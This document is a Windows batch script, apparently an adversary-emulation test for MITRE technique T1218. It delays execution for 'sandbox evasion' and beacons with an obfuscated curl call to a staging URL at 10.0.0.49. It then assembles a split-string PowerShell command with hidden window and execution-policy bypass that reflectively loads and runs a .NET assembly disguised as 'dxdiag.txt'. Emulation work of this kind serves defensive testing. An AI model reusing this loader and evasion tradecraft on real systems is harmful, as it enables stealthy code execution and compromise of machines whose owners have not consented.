@echo off
SETLOCAL EnableDelayedExpansion

REM Random variable names for PHR_ constants
SET txisnba=%APPDATA%\8041\ffe588fc
SET mdvfmsbx=https://10.0.0.49
SET keghkgto=https://10.0.0.49/stage/2/icon.png?8041-7
SET jwcnifl=ITZEL-S2BO
SET rrocubc=7
SET xzanpex=dxdiag.txt
SET dvhhyc=8041

REM Create log directory if it doesn't exist
if not exist "%APPDATA%\!rrocubc!\" mkdir "%APPDATA%\!rrocubc!\" 2>nul

REM Debug log file
SET logfile=%APPDATA%\!rrocubc!\macula-simulations.log

REM Initial delay for sandbox evasion
echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: delay_start=sandbox_evasion >> "!logfile!" 2>nul
timeout /t 45 /nobreak >nul
echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: delay_complete=45s >> "!logfile!" 2>nul

REM Obfuscated command components
SET zxcvb=p
SET qwert=owe
SET asdfg=rshe
SET yuiop=ll.e
SET hjkl= xe
SET mnbv= -nop
SET cxz= -w hi
SET vbn=dden
SET lkj= -ep byp
SET poi=ass
SET tyu= -Co
SET rew=mman
SET dfg=d "& { [Ref
SET iop=lectio
SET jkl=n.Assembl
SET wer= y]::L
SET ert=oad([IO
SET rty=.File]::
SET fgh=ReadAll
SET cvb=Bytes('!xzanpex!')).EntryPoint
SET mkl=.Invoke($null
SET plm=, [str
SET okm= ing[]]@()) }
SET wsx="

REM Build full PowerShell command
SET part1=!zxcvb!!qwert!!asdfg!!yuiop!!hjkl!
SET part2=!mnbv!!cxz!!vbn!!lkj!!poi!!tyu!!rew!!dfg!!iop!!jkl!!wer!!ert!!rty!!fgh!!cvb!!mkl!!plm!!okm!!wsx!

REM Heartbeat check with obfuscated curl
echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: heartbeat_check_start=!keghkgto! >> "!logfile!" 2>nul
SET dl1=c
SET dl2=u
SET dl3=r
SET dl4=l
SET dl5= -k -s -o nul
SET dlcmd=!dl1!!dl2!!dl3!!dl4!!dl5!
!dlcmd! !keghkgto! 2>nul
SET hbresult=0
IF !ERRORLEVEL! EQU 0 (
    SET hbresult=1
    echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: heartbeat_check_complete=success >> "!logfile!" 2>nul
) ELSE (
    echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: heartbeat_check_complete=failed >> "!logfile!" 2>nul
)

REM Random delay
SET /A delay=%RANDOM% %% 20 + 10
echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: random_delay_start=!delay!s >> "!logfile!" 2>nul
ping -n !delay! 127.0.0.1 >nul 2>&1
echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: random_delay_complete >> "!logfile!" 2>nul

REM Change directory
echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: chdir_start=!txisnba! >> "!logfile!" 2>nul
cd /d "!txisnba!" 2>nul
IF !ERRORLEVEL! EQU 0 (
    SET cdresult=1
    echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: chdir_complete=success >> "!logfile!" 2>nul
) ELSE (
    SET cdresult=0
    echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: chdir_complete=failed >> "!logfile!" 2>nul
)

REM Execute .NET assembly via obfuscated PowerShell
echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: assembly_execute_start=!xzanpex! >> "!logfile!" 2>nul
!part1! !part2! 2>nul
SET execresult=0
IF !ERRORLEVEL! EQU 0 (
    SET execresult=1
    echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: assembly_execute_complete=success >> "!logfile!" 2>nul
) ELSE (
    echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: assembly_execute_complete=failed >> "!logfile!" 2>nul
)

REM TTP logging for T1218
SET ttp_result=0
SET ttp_error=
IF !execresult! EQU 1 (
    SET ttp_result=1
    SET ttp_error=
) ELSE (
    SET ttp_error=assembly_load_failed
)

REM Generate timestamp for TTP log
SET ttp_time=%DATE% %TIME%
SET ttp_time=!ttp_time:/=-!
SET ttp_time=!ttp_time:.=:!
SET ttp_time=!ttp_time: = !

(
    echo [!ttp_time!][!jwcnifl!]: !rrocubc!-!dvhhyc!-T1218|Signed Binary Proxy Execution=!ttp_result!:!ttp_error!
) >> "!logfile!" 2>&1
IF !ERRORLEVEL! NEQ 0 echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: ttp_log_failed >> "!logfile!" 2>nul

REM Final delay
CHOICE /C Y /N /D Y /T 15 >nul 2>&1
echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: script_complete >> "!logfile!" 2>nul

ENDLOCAL